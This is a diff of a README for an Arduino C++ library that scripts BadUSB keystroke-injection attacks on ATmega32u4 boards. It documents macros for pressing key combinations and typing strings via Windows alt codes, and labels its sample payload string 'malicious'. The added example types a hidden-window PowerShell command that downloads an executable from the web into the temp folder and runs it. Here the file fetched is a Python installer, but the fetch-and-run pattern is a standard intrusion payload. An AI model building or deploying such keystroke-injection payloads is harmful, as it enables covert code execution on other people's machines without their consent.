@@ -1,6 +1,10 @@
 # EasyBadUsb
 simple header only lib written in C++ to make BadUsb scripting easier (Arduino IDE)
 
+### tested only on ATmega32u4 (HW-374) Arduino Leonardo or Micro
+![screen](images/dis.jpg)
+[image from github.com/ElijahCuff/HW-374](https://github.com/ElijahCuff/HW-374)
+
 # v2 with alt codes (only for Windows)
 
 ### first, include alt.hpp in your sketch file
@@ -48,6 +52,7 @@ static const alt_code alt_codes_array[] = {
 ```cpp
     const char *payload_str = "powershell -windowstyle hidden..."; // malicious string
 
+    // void alt_print(const char *str, size_t t_sleep)
     alt_print(payload_str, 0); // (malicious_string, sleep time for enter next char)
     /* sleep time for enter next char.. because i had problems on Windows 7
     that the system was unable to process alt codes, on Win 10/11 work well */
@@ -75,8 +80,37 @@ static const alt_code alt_codes_array[] = {
 #define MKEY_FN_4 (0x0001 << 0x0A)
 ```
 
-### The PRESS function is used to press special keys and simultaneously press several keys on the keyboard
+### The PRESS functions is used to press special keys and simultaneously press several keys on the keyboard
 ```cpp
+// #define PRESS(BTNS, t_sleep)
 PRESS(MKEY_LEFT_CTRL | MKEY_LEFT_SHIFT | MKEY_ENTER, 200) // (buttons to be pressed, sleep time for press next button)
+
+// #define PRESS_KRELALL(BTNS, t_sleep, t_wait)
 PRESS_KRELALL(MKEY_LEFT_WIN | MKEY_CH_R, 200, 500) // (buttons to be pressed, sleep time for press next button, sleep time to release the buttons)
+
+// bool release_btn(const uint8_t button)
+release_btn(MKEY_ENTER) // (buttons to be released)
+
+// void tprint(const char *str, size_t t_sleep)
+tprint("echo Hello World!", 30) // (string, sleep time for enter next char), default print (NOT ALT)
+
+// #define WAIT(ms)
+WAIT(500) // delay 500 ms
 ```
+
+### example
+```cpp
+#include "alt.hpp"
+
+BEGIN()
+
+    const char *str = "powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('"
+    "https://www.python.org/ftp/python/3.11.7/python-3.11.7-amd64.exe', '%temp%/py_install.exe'); %temp%/py_install.exe";
+
+    RUN_ENTER(str, 0)
+
+END()
+```
+
+### demo
+[![demo](https://img.youtube.com/vi/Osa8dZCe86s/0.jpg)](https://www.youtube.com/watch?v=Osa8dZCe86s)
